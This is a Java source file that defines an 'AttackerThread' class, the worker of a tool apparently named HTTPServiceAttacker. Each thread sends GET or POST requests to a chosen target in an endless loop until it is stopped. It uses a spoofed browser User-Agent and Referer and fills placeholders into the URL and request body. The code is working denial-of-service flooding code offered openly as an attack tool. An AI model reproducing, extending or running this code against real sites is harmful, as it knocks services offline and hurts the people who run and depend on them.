package com.ishland.app.HTTPServiceAttacker.attacker.threads;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Arrays;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.message.BasicHeader;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.ishland.app.HTTPServiceAttacker.attacker.Attack;

public class AttackerThread extends Thread {

    public static final byte GET = 0x00;
    public static final byte POST = 0x01;

    private static int num = 0;

    private Logger logger = null;

    private boolean isStopping = false;
    private String target = null;
    private byte method = GET;
    private String data = null;
    private boolean showExceptions = true;
    private String referer = "";

    public AttackerThread() {
	super();
	num++;
	logger = LogManager.getLogger("Attacker Thread - " + String.valueOf(num));
	this.setName("Attacker Thread - " + String.valueOf(num));
    }

    public void run() {
	logger.info("Starting " + this.getName() + "...");
	boolean isReady = true;
	boolean isError = false;
	if (target == null) {
	    logger.fatal("Target must not be null");
	    MonitorThread.newError();
	    isReady = false;
	}
	if (method == POST && data == null) {
	    logger.fatal("You must set the data in POST mode");
	    MonitorThread.newError();
	    isReady = false;
	}
	List<Header> defaultHeaders = Arrays.asList(new BasicHeader("User-Agent",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"),
		new BasicHeader("Referer", this.referer));
	logger.info("Using " + (method == POST ? "POST" : "GET" + " to attack ") + target);
	logger.info(this.getName() + " started.");
	CloseableHttpResponse httpResponse = null;
	System.out.println(Attack.replacePlaceHolders(this.target));
	System.out.println(Attack.replacePlaceHolders(this.data));
	while (!isStopping && isReady) {
	    if (this.method == GET) {
		HttpGet httpGetReq = null;
		try {
		    httpGetReq = new HttpGet(Attack.replacePlaceHolders(this.target));
		    httpGetReq.setHeaders((Header[]) defaultHeaders.toArray());
		} catch (IllegalArgumentException e) {
		    if (showExceptions)
			logger.fatal("Invaild target url", e);
		    else
			logger.fatal("Invaild target url");
		    MonitorThread.newError();
		    isError = true;
		    break;
		}
		try {
		    httpResponse = Attack.httpClient.execute(httpGetReq);
		} catch (ClientProtocolException e) {
		    if (showExceptions)
			logger.fatal("Invaild http verson, aborting current request...", e);
		    else
			logger.fatal("Invaild http verson, aborting current request...");
		    MonitorThread.newError();
		    continue;
		} catch (IOException e) {
		    if (showExceptions)
			logger.warn("I/O Error, aborting current request...", e);
		    else
			logger.warn("I/O Error, aborting current request...");
		    MonitorThread.newError();
		    continue;
		}
	    } else if (this.method == POST) {
		HttpPost httpPostReq = null;
		try {
		    httpPostReq = new HttpPost(Attack.replacePlaceHolders(this.target));
		    httpPostReq.setEntity(new StringEntity(Attack.replacePlaceHolders(this.data)));
		} catch (IllegalArgumentException e) {
		    if (showExceptions)
			logger.fatal("Invaild target url", e);
		    else
			logger.fatal("Invaild target url");
		    MonitorThread.newError();
		    isError = true;
		    break;
		} catch (UnsupportedEncodingException e) {
		    if (showExceptions)
			logger.fatal("Unsupported Encoding", e);
		    else
			logger.fatal("Unsupported Encoding");
		    MonitorThread.newError();
		    isError = true;
		    break;
		}
		try {
		    httpResponse = Attack.httpClient.execute(httpPostReq);
		} catch (ClientProtocolException e) {
		    if (showExceptions)
			logger.fatal("Invaild http verson, aborting current request...", e);
		    else
			logger.fatal("Invaild http verson, aborting current request...");
		    MonitorThread.newError();
		    continue;
		} catch (IOException e) {
		    if (showExceptions)
			logger.warn("I/O Error, aborting current request...", e);
		    else
			logger.warn("I/O Error, aborting current request...");
		    MonitorThread.newError();
		    continue;
		}
	    }
	    try {
		MonitorThread.pushResult(httpResponse);
	    } catch (NullPointerException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		continue;
	    } catch (IllegalArgumentException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		continue;
	    } catch (InterruptedException e) {
		if (showExceptions)
		    logger.warn("Internal error", e);
		else
		    logger.warn("Internal error");
		MonitorThread.newError();
		continue;
	    }
	}
	try {
	    if (httpResponse != null)
		httpResponse.close();
	} catch (IOException e) {
	}
	if (!isReady) {
	    logger.fatal("Exiting due to configuration error");
	    return;
	} else if (isError) {
	    logger.fatal("Exiting due to an error occured");
	    return;
	} else {
	    logger.info("Exiting due to termination");
	    return;
	}
    }

    /**
     * @return the isStopping
     */
    public boolean isStopping() {
	return isStopping;
    }

    /**
     * @param isStopping the isStopping to set
     */
    public void stopTask() {
	this.isStopping = true;
    }

    /**
     * @return the target
     */
    public String getTarget() {
	return target;
    }

    /**
     * @param target the target to set
     */
    public void setTarget(String target) {
	this.target = target;
    }

    /**
     * @return the method
     */
    public byte getMethod() {
	return method;
    }

    /**
     * @param method the method to set
     */
    public void setMethod(byte method) {
	this.method = method;
    }

    /**
     * @return the data
     */
    public String getData() {
	return data;
    }

    /**
     * @param method the method to set
     */
    public void setData(String data) {
	this.data = data;
    }

    /**
     * @param method the method to set
     */
    public void setShowExceptions(boolean showExceptions) {
	this.showExceptions = showExceptions;
    }

    /**
     * @return the referer
     */
    public String getReferer() {
	return referer;
    }

    /**
     * @param referer the referer to set
     */
    public void setReferer(String referer) {
	this.referer = referer;
    }

}
